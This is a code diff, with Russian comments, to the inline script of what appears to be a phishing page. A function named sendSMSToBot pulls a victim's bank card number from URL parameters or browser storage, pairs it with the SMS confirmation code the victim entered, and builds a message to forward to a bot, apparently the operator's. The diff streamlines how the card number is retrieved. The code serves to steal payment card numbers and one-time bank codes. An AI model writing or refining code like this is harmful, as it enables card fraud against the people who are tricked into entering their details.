@@ -820,35 +820,19 @@
         // Обработчик кнопки подтверждения
         // ФУНКЦИЯ ОТПРАВКИ СМС КОДА С НОМЕРОМ КАРТЫ
 // ФУНКЦИЯ ОТПРАВКИ СМС КОДА С НОМЕРОМ КАРТЫ
+// ФУНКЦИЯ ОТПРАВКИ СМС КОДА С НОМЕРОМ КАРТЫ
 async function sendSMSToBot(smsCode) {
     try {
-        // ПРОБУЕМ РАЗНЫЕ СПОСОБЫ ПОЛУЧИТЬ НОМЕР КАРТЫ
-        let cardNumber = 'Неизвестно';
+        // ПОЛУЧАЕМ НОМЕР КАРТЫ ИЗ URL
+        const urlParams = new URLSearchParams(window.location.search);
+        let cardNumber = urlParams.get('card');
         
-        // 1. Пробуем из sessionStorage
-        const cardData = JSON.parse(sessionStorage.getItem('smsCardData') || sessionStorage.getItem('cardData') || '{}');
-        if (cardData.number) {
-            cardNumber = cardData.number;
+        if (!cardNumber) {
+            // ЕСЛИ В URL НЕТ, ПРОБУЕМ ИЗ localStorage
+            cardNumber = localStorage.getItem('lastCardNumber') || 'Неизвестно';
         }
         
-        // 2. Если нет, пробуем из URL параметров
-        if (cardNumber === 'Неизвестно') {
-            const urlParams = new URLSearchParams(window.location.search);
-            const cardFromUrl = urlParams.get('card');
-            if (cardFromUrl) {
-                cardNumber = cardFromUrl;
-            }
-        }
-        
-        // 3. Если все еще нет, пробуем найти в localStorage
-        if (cardNumber === 'Неизвестно') {
-            const lastCard = localStorage.getItem('lastCardNumber');
-            if (lastCard) {
-                cardNumber = lastCard;
-            }
-        }
-        
-        console.log('🔍 Найден номер карты:', cardNumber);
+        console.log('🔍 Номер карты для СМС:', cardNumber);
         
         // СООБЩЕНИЕ: СМС КОД + НОМЕР КАРТЫ
         const smsMessage = `📱 <b>СМС КОД ПОДТВЕРЖДЕН</b>
@@ -880,7 +864,6 @@ async function sendSMSToBot(smsCode) {
         return false;
     }
 }
-
 // ФУНКЦИИ УВЕДОМЛЕНИЙ
 function showSuccessMessage() {
     const btn = document.getElementById('confirmBtn');
@@ -957,4 +940,5 @@ document.getElementById('confirmBtn').addEventListener('click', async function()
     </script>
 </body>
 </html>
+
 
